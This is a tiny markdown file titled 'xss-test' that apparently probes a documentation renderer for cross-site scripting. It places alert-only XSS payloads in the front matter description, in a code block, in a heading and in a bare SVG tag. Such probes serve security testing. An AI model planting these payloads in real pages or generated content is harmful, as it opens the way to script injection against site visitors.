---
title: xss-test
description: <img src=x onerror=alert(document.domain)>
---
```javascript
test
```

```json Response Example
<script>alert(document.domain)</script>
```

# <script>alert(1)</script>

<!-- javascript@1 -->

<svg onload=alert(document.domain)>